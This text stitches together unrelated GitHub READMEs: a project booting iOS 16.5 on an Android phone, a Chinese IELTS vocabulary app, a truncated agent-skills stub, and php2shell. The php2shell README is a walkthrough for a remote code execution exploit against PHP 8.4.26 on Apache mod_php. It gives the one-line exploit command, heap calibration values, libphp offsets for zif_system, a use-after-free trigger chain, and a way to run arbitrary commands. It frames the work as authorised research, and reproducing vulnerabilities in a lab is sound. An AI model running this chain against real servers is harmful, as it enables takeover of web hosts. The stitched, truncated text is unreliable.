# HackiOS — XNU kernel **HackiOS** boots Apple's open-source **XNU kernel** (`xnu-8796.121.2`, the kernel of iOS 16.5) on Android phone hardware and runs the **unmodified iOS 16.5 user space** on top of it: launchd → backboardd → SpringBoard → apps. Our own EFI loader, our own replacements for Apple's closed drivers, a UEFI port, and a Linux Wi-Fi driver on a compatibility layer make that possible. It runs in two places: - **POCO X5 Pro 5G (redwood, Snapdragon 778G)** — nothing is flashed: the UEFI is started with `fastboot boot`, the whole system lives in RAM, and after a reboot the phone is back in Android; - **QEMU** (`virt`, aarch64) — the same thing on any Linux computer, no phone needed. This repository is half of the project: | Repository | What | |---|---| | **hackios-xnu-kernel** (this one) | XNU patches, the EFI loader, the UEFI port, Wi-Fi, QEMU scripts, `xl`, prebuilt kernel/loader/UEFI, `common/` scripts | | [hackios-xnu-userland](https://github.com/oosexgang/hackios-xnu-userland) | our init, injected libraries, launchd jobs, the APFS image builder, the scripts that take iOS out of Apple's IPSW, Metal/Mesa work | > **No Apple files are in either repository.** `ios165/fetch.sh` downloads the iOS 16.5 IPSW from Apple's own CDN > to *your* machine and extracts what is needed there. HackiOS is an independent research project by OOSEX GANG and > is not affiliated with, authorised or endorsed by Apple Inc. iOS, iPhone and Apple are trademarks of Apple Inc.

Photographed on the phone, the Adreno GPU drawing (`gpu=1`). More in [Screenshots](#screenshots). ## What works | Works | Does not work (yet) | |---|---| | Lock screen, swipe to unlock, home screen with all icons (two pages), stock iOS 16 wallpapers | Cellular, Bluetooth | | System gestures: swipe up (home, app switcher), edge swipe (back), Control Center | Charging under our kernel (the phone only discharges) | | Apps: Settings, Clock, Calendar, Photos, Notes, Safari and more; widgets (Weather, Calendar) on the phone | Metal for apps (in progress: 293 of 456 system shaders already run on the Adreno, see `docs/air.md` in hackios-xnu-userland) | | Phone touchscreen (Goodix GT9916), multitouch, wake on touch; real power and volume keys | App Store content and Apple ID sign-in (no Secure Enclave; FairPlay daemon exits) | | Up to 8 CPU cores (`cpus=8`), big core at 2.4 GHz, ~20 s to the lock screen | Video and Live Photo recording | | Adreno 642L GPU through Mesa/freedreno (`gpu=1`, OpenGL ES for CoreAnimation) | | | Wi-Fi (WCN6750, ath11k): join from Settings, Safari over Wi-Fi, 55–90 Mbit/s | | | Sound (speakers, main microphone), camera in Camera.app (front/rear, preview, focus, HEIC photos) | | | Data that iOS writes survives a reboot (`var_store=1 ufs_write=1`); iOS root volume on the phone's flash | | | Sileo + Procursus (dpkg, apt), tweaks, SSH | | It is a research bench, not a ROM: a session lasts a given number of seconds, then the kernel returns to the loader and hands over its log. ## Quick start: QEMU, no kernel build `prebuilt/` holds the kernel, loader and our programs built from these repositories, so all you need is the system image, which is made on your machine from Apple's IPSW. Needs: Linux x86-64, ~12 GB free disk, 4 GB free RAM. Packages (Arch): ```sh sudo pacman -S --needed git python 7zip lz4 gcc qemu-system-aarch64 qemu-ui-gtk edk2-aarch64 ``` (Debian/Ubuntu: `git python3 7zip liblz4-dev gcc qemu-system-arm qemu-efi-aarch64`; 7-Zip must be 23 or newer — it reads APFS.) ```sh git clone https://github.com/oosexgang/hackios-xnu-kernel.git hackios cd hackios common/setup.sh # brings hackios-xnu-userland into the same tree, checks the host ios165/fetch.sh # downloads 7.4 GB from Apple's CDN and extracts what is needed (5-15 min) common/build.sh qemu-virt # builds the APFS images (and the kernel, if the toolchain is there) common/run.sh qemu-virt # a 20-minute session in a QEMU window ``` The lock screen appears after 2–3 minutes. - **Mouse with the left button held = finger.** Unlock / leave an app: swipe up from the very bottom edge; back: swipe from the left edge. - Keys: `H` home, `L` lock/power, `↑`/`↓` volume, `F11` (hold) five fingers. - From a script: `qemu/touch.py swipe 0.5 0.985 0.5 0.3 250`, `qemu/touch.py tap 0.615 0.71`, `qemu/touch.py key home`; screenshot: `qemu/screendump.sh shot.png`. - Right after SpringBoard appears the system is still registering apps: give it 30–40 s. - Debian/Ubuntu UEFI firmware: `QEMU_EFI=/usr/share/AAVMF/AAVMF_CODE.fd QEMU_VARS=/usr/share/AAVMF/AAVMF_VARS.fd`. ## On the phone (POCO X5 Pro 5G) You need a **POCO X5 Pro 5G (redwood)** with an unlocked bootloader, `adb` and `fastboot`, and the images from the section above. Nothing is written to the phone's storage. **The phone's own firmware** is not in the repository and cannot be: it is the vendor's and is taken from the very phone it will run on, from its Android: ```sh adb pull /vendor/firmware/a660_{gmu.bin,sqe.fw,zap.mdt,zap.b00,zap.b01,zap.b02} fw-gpu/ # GPU (gpu=1) adb pull /vendor/firmware_mnt/image/wpss.{mdt,b02,b03,b04,b05,b06,b07} fw-wifi/ # Wi-Fi (wifi=1) adb pull /vendor/firmware_mnt/image/adsp.{mdt,b02,...,b36} fw-audio/ # sound (adsp=1) adb pull /vendor/firmware/aw8697_haptic.bin fw-haptic/ # haptics ``` (Put the `fw-*` directories next to the workspace. Wi-Fi also needs `fw-wifi/mac` — the radio's address on one line — and `fw-wifi/network` — network name and password. `userland/build.sh` prints which firmware went in.) ```sh common/build.sh redwood GL=1 # images + out/redwood-boot.img common/run.sh redwood 900 # loader into RAM, system image into RAM, a 15-minute session ``` or step by step with `xl`: ```sh ./xl enter # Android -> fastboot -> our loader in RAM (fastboot boot); it brings up its own USB link ./xl ramdisk # upload the system image into the phone's RAM (2.5 GB, ~80 s), once per loader session XL_SECS=900 XL_CMDLINE="touchscreen=1 cpufreq=1 bootcpu=7 cpus=8 gpu=1 wifi=1 adsp=1" ./xl run ./xl screenshot shot.png ./xl reboot # back to Android ``` `./xl` with no arguments lists every command (logs, screen and sound recording, camera frames, stop, state...). ## Prebuilt boot image Every release has `hackios-redwood-boot.img` attached: the redwood UEFI with our loader inside, ready for `fastboot boot`. It contains no Apple files; the system image is still made on your machine (above). ## Building from source `common/build.sh ` runs every step that this machine can run and uses `prebuilt/` for the rest. - **Kernel** — needs [theos](https://theos.dev/docs/installation-linux) in `~/theos` (cctools and `iPhoneOS16.5.sdk`) and `clang lld python perl`. Details: [xnu/README.md](xnu/README.md). ```sh xnu/apply.sh && xnu-deps/setup.sh && ./xnu-build.sh -j8 -k ``` - **Loader** — `xnuloader/build.sh` (clang + lld-link, an EFI application without EDK2). - **Images** — `REST=1 userland/build.sh` (variables documented at the top of that file). - **UEFI** — [uefi/README.md](uefi/README.md) (Project Silicium port); not needed to run, `prebuilt/uefi` has it. - After rebuilding: `tools/update-prebuilt.sh` refreshes `prebuilt/`. ## Porting to another device ```sh common/new-device.sh path/to/device.dtb # profile + loader platform from the phone's device tree ``` Then follow [docs/PORTING.md](docs/PORTING.md): the UEFI port, the loader's platform description, the kernel's drivers, the firmware. Device profiles live in `common/devices/` (`redwood.conf`, `qemu-virt.conf`, `_template.conf`). ## How it works ``` fastboot boot ──► UEFI (Mu-Silicium) ──► xnuloader (EFI application) │ stays resident: USB link (fastboot protocol), │ watchdog, receives the kernel's log ▼ XNU (BCM2837 config as the base + our platform) ├─ GICv3, timer, video console, return to the loader ├─ APFS (images in RAM, iOS volume on flash), ramfs (/private/var, /tmp) ├─ minicrypto instead of corecrypto, AMFI and Sandbox stand-ins (MAC policies) ├─ driver replacements: IOSurface, IOMobileFramebuffer, AppleKeyStore, network stack ├─ input: /dev/redwood-touch ◄─ Goodix GT9916 (phone) / virtio-input (QEMU) ├─ GPU: Adreno 642L, Wi-Fi: WCN6750 (ath11k via LinuxKPI), sound: ADSP / virtio-sound ▼ iOS 16.5 launchd → logd, notifyd, cfprefsd, runningboardd, backboardd, SpringBoard, apps ├─ our libraries are injected into backboardd, SpringBoard and mediaserverd │ (virtual HID services, a few ObjC method swaps — in memory only) └─ mediaserverd gets our CoreAudio output device (RedwoodAudio.driver) ``` The iOS programs, frameworks and dyld shared cache are not changed by a single byte: what they miss is done by the kernel (driver replacements) or by a library the kernel injects with `DYLD_INSERT_LIBRARIES` (`kern.exec_inject`). ## Layout | Path | What | |---|---| | `common/` | `setup.sh` (workspace), `build.sh` / `run.sh` (per device), `new-device.sh`, `devices/*.conf`, `ugit` | | `xl` | drives the phone over USB: loader, kernel runs, logs, screenshots, screen and sound recording | | `xnuloader/` | the loader: `loader.c` (UEFI application), `mkpayload.py` (kernel + images + arguments container) | | `xnu/` | our XNU changes: patch, new files, `apply.sh` / `export.sh` | | `xnu-deps/` | everything for building XNU on Linux: `setup.sh`, tool wrappers, stubs | | `xnu-build.sh`, `xnu-env.sh` | kernel build | | `uefi/`, `mkxnuimg.py` | the UEFI port and packing the boot image for `fastboot boot` | | `wifi/lx/` | the layer on which Linux's Wi-Fi driver builds for our kernel | | `qemu/` | QEMU runs, touch input, screenshots, stack symbolication | | `tools/` | recording (`recording.py`, `sound.py`), UFS/flash tools, `mk-ath11k.sh`, `new-workspace.sh`, host tests | | `prebuilt/` | built kernel, loader and UEFI pieces (`NOTICES.md` for the third-party code in the kernel) | | `docs/` | screenshots, [checks.md](docs/checks.md), [PORTING.md](docs/PORTING.md) | ## Debugging - Session log: QEMU's stdout or `logs/HHMMSS-run.log` from the phone. - `RC_JOBS=rc.jobs.tour REST=1 userland/build.sh` — an image that unlocks and opens every app of the first page. - `userabort:` in the log is the stack of a process that called `abort()`; `usertrap:` (with `systrace=1`) — crashes. - Live stacks (QEMU): `qemu/touch.py stacks NAME`, then `qemu/symstack.py LOG NAME` (needs [`ipsw`](https://github.com/blacktop/ipsw)). - How a check can lie to you: [docs/checks.md](docs/checks.md). ## Screenshots From the phone's screen, one session (`GL=1 REST=1`, `gpu=1`):

## Licenses - No iOS files are in the repositories: `ios165/fetch.sh` downloads them from Apple's CDN to your machine. - `xnu/` is a derivative work of XNU and is distributed under APSL 2.0, like XNU itself; `prebuilt/mach.*` is the kernel built from it. It also contains ath11k (BSD-3-Clause-Clear) and FreeBSD LinuxKPI code (BSD-2-Clause): see [prebuilt/NOTICES.md](prebuilt/NOTICES.md). - `xnu/files/bsd/miscfs/apfs/libzbitmap/` and `xnu-deps/build/lzbitmap/` — libzbitmap (Corellium LLC, MIT here); `xnu/files/bsd/miscfs/apfs/libdeflate/` — libdeflate 1.24 (Eric Biggers, MIT, `COPYING` there). - ath11k, Linux and FreeBSD sources are not in the repository: `tools/mk-ath11k.sh` fetches pinned releases. `wifi/lx/patches/*.patch` are our changes to FreeBSD headers; the rest of `wifi/lx/` is ours. - `uefi/files/Binaries/redwood` and `prebuilt/uefi/SILICIUM_UEFI.fd` contain UEFI drivers from the phone's Xiaomi firmware, distributed the way Project Silicium distributes them for other devices; `prebuilt/uefi/mkbootimg.py` — AOSP, Apache-2.0. - This repository is licensed under the [Apple Public Source License 2.0](LICENSE): our changes to XNU are a derivative of XNU and must be, and our other code here (loader, scripts) is released under the same license. Third-party code keeps its own license, as listed above. ## Team OOSEX GANG — [@oodze](https://t.me/oodze) (founder), [@netusd](https://t.me/netusd), [@wannqn](https://t.me/wannqn), [@hxfuxyyXD](https://t.me/hxfuxyyXD). # 词光 · Word Atlas **一词一画，点亮雅思。** 7,298 个雅思核心词，每个词一幅原创插画、两条原创例句、英美发音和一套刚刚好的复习节奏。
免费，开源，无需注册，打开网页就能背。 [**打开词光 →**](https://0xlei.tech/words/)  ·  [▶ 看宣传片](docs/assets/launch.mp4)  ·  [下载词库](data/)  ·  [English](README.en.md) ![MIT](https://img.shields.io/badge/code-MIT-1E2640) ![CC BY 4.0](https://img.shields.io/badge/content-CC%20BY%204.0-C4573A) ![words](https://img.shields.io/badge/words-7%2C298-7F9B77) ![FSRS](https://img.shields.io/badge/scheduler-FSRS%206-D9A03A) ![no login](https://img.shields.io/badge/login-not%20required-6F93AE) ![GitHub stars](https://img.shields.io/github/stars/designfuchen/word-atlas?style=flat&color=E8B65A) 每本单词书都从 abandon 开始，也停在 abandon。▶ 点击画面看 48 秒完整宣传片（有声音）
--- ## 为什么做词光 背单词最难的不是“看过”，而是“想得起来”。 纸质单词书把 7,000 个词排成一张清单，大多数人翻到第一页就停下了。词光换了个做法：给每个词一幅画，让你先**看见**它；用主动回忆让你**想起**它；再用 FSRS 算法在你快要忘记的时候让你和它**重逢**。你学会的每一个词，都会在自己的词汇星图上点亮一颗星。 这是一个个人项目。所有释义、例句、插画和录音都是为这个项目新做的，制作成本由作者自己承担，然后全部开源，任何人都可以免费使用、修改和再分发。 ## 一眼看懂 | 数量 | 内容 | |---:|---| | **7,298** | 雅思核心词条，CEFR A1–C2 分级，19 个雅思高频话题 | | **7,298** | 幅原创插画，统一的复古图鉴画风，画的就是例句里的场景 | | **14,596** | 条原创例句：一条日常短句帮你记住，一条雅思语境长句帮你会用 | | **22,905** | 段录音：英音、美音单词发音，以及例句朗读 | | **0** | 账号、广告、追踪。进度只保存在你自己的设备上 | ## 看一看，听一听 7,298 幅插画、22,905 段录音、24 段界面声音，都是为词光专门做的。下面是一小部分。 ### 🖼 每个词一幅画 画面讲的就是例句里的那件事，同一种复古图鉴画风贯穿全部 7,298 个词。

abandon 遗弃；抛弃
We had to abandon our car in the snow.
volcano 火山
We watched steam rising from the volcano across the lake.
orchestra 管弦乐队
The orchestra began playing as the lights dimmed.
telescope 望远镜
We watched the moon through a telescope on the balcony.

migrate 迁徙；移居
These birds migrate south when the weather turns cold.
festival 节日；庆祝活动
Our town holds a lantern festival every autumn.

### 🔊 每个词都会读 拿 *abandon* 举例，点开就能听（在线播放）： | | | |---|---| | 🇬🇧 英音 | [abandon /əˈbændən/](https://0xlei.tech/words/atlas/audio/uk/abandon.mp3) | | 🇺🇸 美音 | [abandon /əˈbændən/](https://0xlei.tech/words/atlas/audio/us/abandon.mp3) | | 📖 例句朗读 | [We had to abandon our car in the snow.](https://0xlei.tech/words/atlas/audio/ex/abandon.mp3) | 全部 7,298 个词都有英音、美音和例句朗读，还有 1,011 个重点词的第二条例句也配了朗读。 ### 🎧 整个应用都有声音 | | | |---|---| | 🎙 **开屏配音** | [「欢迎打开雅思大门」](https://0xlei.tech/words/sfx/splash-voice.mp3)：星尘汇聚成“词光”，大门打开 | | 🌌 **星图配音** | [「这是你的词汇星图。每学会一个词，就点亮一颗星。」](https://0xlei.tech/words/sfx/voice-galaxy-hello.mp3) | | 🎵 **星空音乐** | [一段可无缝循环的原创配乐](https://0xlei.tech/words/sfx/amb-stars.mp3)，默认陪你背词 | | 🌧 **6 段环境声** | [雨天图书馆](https://0xlei.tech/words/sfx/amb-rain.mp3) · [清晨海岸](https://0xlei.tech/words/sfx/amb-sea.mp3) · [林间早晨](https://0xlei.tech/words/sfx/amb-forest.mp3) · [夜晚壁炉](https://0xlei.tech/words/sfx/amb-fire.mp3) · [远航船舱](https://0xlei.tech/words/sfx/amb-voyage.mp3) · [安静咖啡馆](https://0xlei.tech/words/sfx/amb-cafe.mp3) | | ✨ **界面音效** | 答对、答错、翻卡、打字、连胜、点亮星星……每个操作都有自己的声音；读单词时背景音会自动压低 | 全部素材都在仓库里：插画在 `public/atlas/img/`，录音在 `public/atlas/audio/`，这两类按 CC BY 4.0 开放；界面声音和配乐在 `public/sfx/`，随应用一起提供。 ## 每个词都有什么 | | | |---|---| | 🖼 **一幅插画** | 画面讲的就是第一条例句里的事。抽象词也用具体场景表达，比如 *abandon* 是雪地里被丢下的车。 | | 🔊 **英美发音** | 英音、美音分别合成，例句也会读（AI 语音，ElevenLabs）。 | | ✍️ **两条原创例句** | 日常句 + 雅思语境句（教育、环境、科技、城市……），都配自然的中文翻译。 | | 📚 **中英释义** | 最多 3 个常用义项，按雅思使用频率排序，附简明英文解释。 | | 🧩 **搭配、词族、近反义** | 高频搭配带中文，词族之间可以互相跳转。 | | 💡 **一条提示** | 易混词、用法陷阱或记忆方法，不编造词源。 | ## 词汇星图 7,298 个词就是 7,298 颗星。19 个话题各成一条旋臂，简单的词在中心，难的在外缘。没学的是星尘，学习中的会发光，掌握了的燃成白色，今天新点亮的是金色。拖动旋转、滚动缩放，点任意一颗星就能打开它的词卡。 星图用 WebGL2 自定义着色器渲染，不支持的设备会自动降级。 ## 怎么帮你记住 - **主动回忆**：看义选词、看图补句、听音辨词、拼写，四种题型从“认得”走到“会写”。 - **FSRS 间隔复习**：和新版 Anki 同款的开源记忆算法，只在你快要遗忘时安排复习，目标记忆率可调。 - **诚实的统计**：只有第一次作答计分。答错的词会换个题型再练，但重试不会抬高正确率。 - **从你的水平开始**：选 A2 / B1 / B2 / C1 起点，跳过已经熟悉的词。 - **打字工作室**：单词、例句抄写、整句听写三种模式，WPM 和准确率单独统计，不影响记忆数据。 - **声音设计**：每个操作都有温和的木琴、纸张和铃声音效；一段星空音乐和 6 段环境声（雨天图书馆、清晨海岸、夜晚壁炉……）陪你专注，读单词时自动压低。 - **开屏仪式**：星尘汇聚成“词光”，大门打开，“欢迎打开雅思大门”。每天一次，可以关掉。 - **离线可用**：看过的词、插画和音频都缓存在本地，没网也能复习。 - **分享卡片**：任何一个词、每天的学习成果，都能一键生成图片。 - **备份恢复**：进度可以导出成文件，换设备时导入即可。
## 一份可以自由使用的词库 `data/` 里是完整词库，内容采用 **CC BY 4.0**：注明出处即可自由使用、修改、商用。 | 文件 | 内容 | |---|---| | [`data/word-atlas.json`](data/word-atlas.json) | 完整结构化数据 | | [`data/word-atlas.csv`](data/word-atlas.csv) | 表格版，可直接导入 Excel / Anki | | `public/atlas/img/` | 7,298 幅 512 px WebP 插画（另有 256 px 缩略图） | | `public/atlas/audio/` | `uk/` `us/` 单词发音，`ex/` `ex2/` 例句朗读，MP3 | ```json { "id": "principle", "w": "principle", "uk": "/ˈprɪnsəpəl/", "us": "/ˈprɪnsəpəl/", "senses": [{ "pos": "n.", "zh": "原则；行为准则", "en": "A belief or rule that guides decisions and behaviour." }], "ex": [ { "en": "I refused the extra money as a matter of principle.", "zh": "出于原则，我拒绝了那笔额外的钱。" }, { "en": "The principle of equal opportunity should guide policies designed to improve access to higher education.", "zh": "…" } ], "col": ["in principle｜原则上", "basic principle｜基本原则"], "fam": ["principled (adj.)"], "tip": "principle 是原则；principal 是校长、主要的。", "cefr": "B2", "topic": "thinking" } ``` 三行代码就能用起来： ```python import json words = json.load(open("data/word-atlas.json", encoding="utf-8")) b2_env = [w for w in words if w["cefr"] == "B2" and w["topic"] == "environment"] ``` 可以拿它做 Anki 牌组、背词小程序、浏览器插件、AI 应用的评测集，或者你自己的研究。字段说明见 [docs/dataset.md](docs/dataset.md)。 ## 本地运行 需要 Node.js 20+。 ```bash git clone https://github.com/designfuchen/word-atlas.git cd word-atlas npm ci npm run dev ``` 打开 `http://localhost:5188`。同一 Wi-Fi 下的手机可以访问终端里显示的 Network 地址。 ```bash npm test # 单元测试 npm run check:atlas # 校验词库结构与媒体文件 npm run build # 生产构建，输出到 dist/ ``` 部署就是把 `dist/` 放到任意静态托管。子路径部署用 `ATLAS_BASE=/words/ npm run build`，见 [docs/deployment.md](docs/deployment.md)。 ## 内容是怎么做出来的 词表来自常见的雅思阅读核心词，去重后 7,298 个词条。词条内容全部是本项目新写的： 1. **文字**：大语言模型按统一的词典编写规范，逐词生成释义、例句、搭配和提示，再做结构和一致性校验。 2. **插画**：图像模型按统一画风逐词绘制，画面对应第一条例句。 3. **声音**：英音、美音和例句朗读由 ElevenLabs 合成；界面音效和环境声同样为本项目生成。 生成脚本在 [`scripts/atlas/`](scripts/atlas)，完整流程见 [docs/pipeline.md](docs/pipeline.md)，记忆模型见 [docs/learning-model.md](docs/learning-model.md)。 > **诚实说明**：内容经过了结构、引用和一致性的自动校验，但没有逐条人工审校，可能有个别不准确的释义、例句或插画。发现问题欢迎提 Issue，或者直接修改 `data/` 提 PR。这不是官方雅思词表，也不承诺提分。 ## 参与贡献 - **纠错**：在 Issue 里写清楚词条 id 和问题，或者直接提 PR。每一处纠错都会让下一个人背得更准。 - **新功能**：先开 Issue 讨论，保持“无账号、本地优先、安静好看”的方向。 - **代码**：TypeScript 严格模式，`npm test` 和 `npm run check:atlas` 需要通过。 详见 [CONTRIBUTING.md](CONTRIBUTING.md)。 ## 授权 - 代码：[MIT](LICENSE) - 词库文本、插画、录音：[CC BY 4.0](CONTENT_LICENSE.md)，署名 “Word Atlas contributors（词光）” - 字体 Fraunces：SIL Open Font License；记忆算法 [ts-fsrs](https://github.com/open-spaced-repetition/ts-fsrs)：MIT ## items.readme:
# php2shell — PHP 8.4.26 session 漏洞复现

中文 | [English](readme_en.md)

在“完全远程、只用 HTTP、目标页面无 `session_start()`、不写任何目标侧 PHP”的约束下，用**一个 `exploit.py`** 打通 PHP 8.4.26 + Apache prefork + mod_php 的 RCE。官方 `php:8.4.26-apache` 镜像已实测 **3/3** 一键成功（`PROOF: uid=33(www-data)...`）。当前版本要求 `display_errors=1`；`display_errors=0` 已打通纯 HTTP 堆泄漏，完整 RCE 稍后提交。

## exp

下面是从零到 RCE 的完整命令，整段复制执行即可。本仓库不编译 PHP/Apache，没有 `docker build`：环境就是官方 `php:8.4.26-apache` 镜像加 `docker/` 下的配置挂载。

```bash
# 依赖：Docker Engine/Desktop + Docker Compose v2 + Python 3.9+
git clone https://github.com/9bie/php2shell-bypass-aslr-exp.git
cd php2shell-bypass-aslr-exp

# 1) 拉官方镜像（PHP 8.4.26 / Debian 12 / Apache prefork）
docker compose -f docker/docker-compose.yml pull

# 2) 起目标：单 worker、display_errors=On、memory_limit=8M
docker compose -f docker/docker-compose.yml up -d

# 3) 等 Apache 就绪并确认普通页面
for i in $(seq 1 20); do
  curl -fsS http://127.0.0.1:8088/index.php >/dev/null 2>&1 && break
  sleep 0.5
done
curl -s http://127.0.0.1:8088/index.php   # OK

# 4) 一条命令完成整个利用；首次运行会自动读取 libphp 偏移
python3 exploit.py -u http://127.0.0.1:8088/index.php
# PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> 已经在仓库目录内就跳过 `git clone`/`cd`；`pull` 也可以省略，`up -d` 会自动拉镜像。

`exploit.py` 自动完成 worker 轮换、两阶段泄漏、`zif_system` 执行和 proof 读取，每个阶段内置重试。运行环境：

| 组件 | 版本 | 来源 |
|---|---|---|
| PHP | 8.4.26（NTS，mod_php） | `php:8.4.26-apache` |
| 基础系统 | Debian 12 (bookworm) | 同上 |
| Apache | 2.4.69（官方镜像内 Debian 12 包，实测） | 同上 |
| MPM | prefork，单 worker | [docker/apache.conf](docker/apache.conf) |
| lab 报告中的 Apache | 2.4.68（原 lab 自编译，`--profile lab`） | 若需完全一致，用 [apache/httpd](https://github.com/apache/httpd) 的 2.4.68 tag |

官方镜像仓库：[docker-library/php](https://github.com/docker-library/php)（Docker Hub: [`php:8.4.26-apache`](https://hub.docker.com/_/php)）；PHP 源码：[php/php-src](https://github.com/php/php-src)（tag `php-8.4.26`）。

首次运行会自动执行 [docker/offsets.py](docker/offsets.py)：从容器内 `libphp.so` 读取 `zif_system` / `zval_ptr_dtor` 的真实偏移并写入 `out/offsets.env`，`exploit.py` 自动加载，所以更换官方镜像或升级后不用手改偏移。默认命令是 `id>/out/p1`（10 字节），容器里的 `/out` 挂载到仓库的 `./out`，proof 直接落在本机：

```text
[*] target http://127.0.0.1:8088/index.php (cmd='id>/out/p1')
[*] no offsets file; reading libphp symbols from container php2shell-target
zif_system     0x...
zval_ptr_dtor  0x...
[+] chunk base = 0x...
[+] libphp base = 0x...
[*] stage 3: HTDATA=0x... ZIF=0x...
PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

payload 里的命令上限是 **14 字节**。要跑任意命令，把脚本写到挂载目录，再用 `sh</out/c`（8 字节）执行：

```bash
printf 'id; uname -a > /out/p1\n' > out/c
python3 exploit.py -u http://127.0.0.1:8088/index.php -c 'sh</out/c'
```

常用参数：`--profile`、`--cmd`、`--proof-file`、`--fetch`、`--zif-offset`、`--dtor-offset`、`--htdata-offset`、`--no-pre-rotate`、`--retries`。默认 profile 是 `bookworm`（官方镜像）；原 lab 构建用 `--profile lab`。`--offsets-file ''` 可关闭自动读取，容器名不是 `php2shell-target` 时用 `--docker-container` 指定。

bookworm 的堆标定已内置：stage1 filler 数 **841**；stage2 目标数组 **406**、元素值长度 **16**；stage3 `HTDATA=chunk+0x690d8`，A 的 pad 为 6×(31,31)，并额外带 32 字符合法 `Cookie: PHPSESSID`，使 B 复用 stale id（`send_cookie=0`），避免 session 的 `Set-Cookie` 头在 `R0+16` 覆盖 `val.type`；B 用 15B carrier 覆盖 reference 的 `val.value`。官方镜像的 libphp 偏移自动读取为 `zif_system=0x465370`、`zval_ptr_dtor=0x65eb60`；原 lab 用 `0x43a870` / `0x613c50`。

## 机制概览

漏洞面是 `session.upload_progress` 在 RINIT 之前触发的 session 初始化，以及 OOM bailout 后跨请求残留的悬空指针。下面以 lab 构建为例；官方镜像的 bookworm 标定值见 exp 末尾。

整条链的攻击流量全部是普通 multipart HTTP，目标页面只有 `<?php echo "OK\n"; ?>`：

0. **worker 轮换**：`A_bigfields`（3MB 存活 POST 字段 + 12MB OOM）后紧跟一个会初始化 session 的 B，child 以 SIGABRT 退出；prefork fork 出的新 worker 继承相同的 libphp/chunk 映射。
1. **堆泄漏**：A 用 1001 个字段触发 `max_input_vars` 警告（`display_errors=On` → `headers_sent=1`），`PHPSESSID=\x00` 生成新 id 并置 `send_cookie=1`，最后的 12MB 字段在 `php_session_initialize()` 内 OOM，`PS(http_session_vars)` 悬空。B 用 56B multipart 原始值缓冲区重占旧 reference，并用存活的 192B zend_string 承载 fake HashTable；`php_url_encode()` 越界读把 Zend MM chunk 指针写进 `Set-Cookie`（4096B、98 个指针）。
2. **libphp 泄漏**：A 把悬空 `PS(id)` 放到 `chunk+0xb7400`；B 的 56B HashTable 页让 `ZSTR_LEN(PS(id))` 读到 `nTableSize=16`，数据区正好是 `nNextFreeElement|pDestructor`；`pDestructor = ZVAL_PTR_DTOR = libphp+0x613c50`，从 `Set-Cookie` 解出 libphp base。
3. **命令执行**：A 用 6 个 pad 把悬空 reference 固定到 `R0=chunk+0x24e0`；B 用 55B raw buffer 覆盖 `R0-0x10`，fake HashTable 放在 `chunk+0x6e0d8` 的 167B 存活字符串里，`pDestructor = zif_system = libphp+0x43a870`。触发链：

   ```text
   php_session_track_init()
     zval_ptr_dtor(PS(http_session_vars))
       zend_reference_destroy(R0)
         zval_ptr_dtor(&ref->val)          # IS_ARRAY_EX
           zend_array_destroy(fake HT)
             zend_hash_destroy(fake HT)
               pDestructor(&bucket->val)   # zif_system
   ```

   终端只使用 libphp 内的 `zif_system`，不需要 libc。

## 机制分析

- **页面为什么不需要 `session_start()`**：A/B 的 session 初始化发生在 RINIT 前的 multipart 回调里（`FILE_START → php_session_rfc1867_update → php_session_initialize()`；`END → php_session_rfc1867_cleanup → php_session_initialize()`），与脚本内容无关。
- **指针为什么会悬空**：A 在 `php_session_initialize()` 内 OOM bailout，`PS(http_session_vars)` / `PS(id)` 没有被清空；下一个请求初始化 session 时 `php_session_track_init()` 对它执行 `zval_ptr_dtor`。
- **为什么能重占**：multipart 普通字段的值在请求解析阶段被分配成 zend_string；56B block、55B reference、167B 字符串这些尺寸正好覆盖旧 reference、承载 fake HashTable。
- **为什么能过 ASLR**：两次 `Set-Cookie` 越界读分别给出 chunk base 和 libphp base；阶段之间用纯 HTTP abort/fork 换 worker，地址空间不变；终端不依赖 libc。
- **历史线**：`session_unset()` + 用户态 `__destruct` 的 Defect D（`arData` UAF）已在自定义 PHP 页面取得 RCE（[NOASLR_REPORT.md](NOASLR_REPORT.md)），但违反“不写特定 PHP”约束，仅作机制参考。

地址/偏移（相对 chunk 或 libphp，与 ASLR 无关）：

| 位置 | 含义 |
|---|---|
| `chunk+0xb7400` | 阶段 2 悬空 `PS(id)` |
| `chunk+0xb73f0` | 阶段 2 目标 HashTable（`a0443`） |
| `chunk+0x6e0d8` | 阶段 3 fake HashTable 字符串数据 |
| `chunk+0x24e0` | 阶段 3 悬空 reference `R0` |
| `libphp+0x613c50` | `ZVAL_PTR_DTOR` |
| `libphp+0x43a870` | `zif_system` |

上表是 lab 构建（`--profile lab`）。官方镜像（默认 `--profile bookworm`）的对应标定为：stage1 filler 数 **841**；stage2 目标数组 **406**、元素值长度 **16**；stage3 `HTDATA=chunk+0x690d8`，A pad 6×(31,31) 并带 32 字符合法 `Cookie: PHPSESSID`，B 用 15B carrier；libphp 偏移由 `docker/offsets.py` 自动读取（`0x465370` / `0x65eb60`）。

详细机制、gdb 证据与请求校准见 [HTTP_HEAP_LEAK.md](HTTP_HEAP_LEAK.md)（堆泄漏）、[ASLR_PURE_HTTP.md](ASLR_PURE_HTTP.md)（libphp 泄漏与全链）、[DISPLAY_ERRORS_OFF.md](DISPLAY_ERRORS_OFF.md)（不依赖 `display_errors` 的泄漏）、[NOTES.md](NOTES.md)（根因与源码位置）。

## 复现声明

- **一个 exp 复现全部**：`python3 exploit.py -u ...` 一条命令完成 worker 轮换、堆泄漏、libphp 泄漏和 `zif_system` 执行；不需要目标侧文件、不需要 `session_start()`、不需要本地信号。
- **纯 HTTP**：攻击流量只有 multipart POST，目标 webroot 只有 `<?php echo "OK\n"; ?>`。
- **环境**：官方 `php:8.4.26-apache`（PHP 8.4.26 / Debian 12 / Apache 2.4.69 prefork）+ [docker/php.ini](docker/php.ini)、[docker/apache.conf](docker/apache.conf)，默认 `--profile bookworm`，实测 **3/3**。原 lab 构建（Apache 2.4.68、最小 PHP）用 `--profile lab`；两套 profile 的 chunk 偏移和 stage3 触发方式已分别标定。
- **边界**：当前 RCE 要求 `display_errors=1`、`memory_limit=8M`、`max_input_vars=1000`、`session.use_cookies=1`、`session.use_strict_mode=0`、单 worker prefork；`display_errors=0` 的完整 RCE 稍后提交。
- 仅用于授权环境中的漏洞研究与复现。

# tstack

The agent skills I use every day, cleaned up so anyone can use them. They work
in Claude Code and Codex. Some use [T3 Code](https://github.com/pingdotgg/t3code)
features when they are available and fall back to native tools when they are
not.

## Skills

| Skill | Say | What it does |
|---|---|---|
